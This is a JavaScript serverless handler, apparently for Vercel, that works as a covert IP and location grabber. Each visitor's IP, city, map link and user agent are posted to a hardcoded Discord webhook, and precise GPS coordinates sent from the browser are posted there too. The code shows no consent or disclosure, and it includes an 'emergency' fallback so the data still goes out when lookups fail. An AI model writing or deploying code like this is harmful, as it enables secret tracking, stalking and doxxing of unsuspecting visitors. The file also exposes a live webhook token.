export default async function handler(req, res) {
    // Enhanced IP detection for Vercel/Cloudflare
    const ip = req.headers['x-real-ip'] ||
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.socket?.remoteAddress ||
        '0.0.0.0';

    const webhookUrl = 'https://discord.com/api/webhooks/1477832242129666110/8QnLpB39E68xVJCXeU_Dfi9cM8SpNY76L8wLkCq0BPJlnlvUYSpEq5ymKkEJq4R7st38';

    // --- STEP 2: Handle GPS Coordinates (POST) ---
    if (req.method === 'POST') {
        const { latitude, longitude } = req.body;
        const mapLink = latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'No coordinates received';

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🎯 **PRECISE LOCATION RECEIVED!**\n**IP**: ${ip}\n**Exact Map**: ${mapLink}\n**Time**: ${new Date().toLocaleString()}`
                })
            });
            return res.status(200).json({ success: true });
        } catch (err) {
            console.error('GPS logging error:', err);
            return res.status(500).json({ error: 'Failed to send GPS log' });
        }
    }

    // --- STEP 1: Handle Initial Visit (GET/Default) ---
    try {
        // Attempt Geo-IP lookup
        const geoResponse = await fetch(`https://ipwhois.app/json/${ip}`).catch(() => null);
        const geoData = geoResponse ? await geoResponse.json() : { success: false };

        const { city, region, country, latitude, longitude, success } = geoData;
        const mapLink = success ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'N/A';

        const content = `🚀 **Visitor Detected!**\n**IP**: ${ip}\n**Location**: ${success ? `${city}, ${region}, ${country}` : 'Unknown'}\n**Map**: ${mapLink}\n**Device**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`;

        // Send to Discord
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content })
        });

        return res.status(200).json(geoData);
    } catch (error) {
        // EMERGENCY FALLBACK: If everything fails, try to send a basic message
        console.error('Visit logging error:', error);
        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `⚠️ **Emergency Log!**\n**IP**: ${ip}\n**Error**: ${error.message}` })
            });
        } catch (e) {
            console.error('Final fallback failed:', e);
        }
        return res.status(200).json({ ip });
    }
}
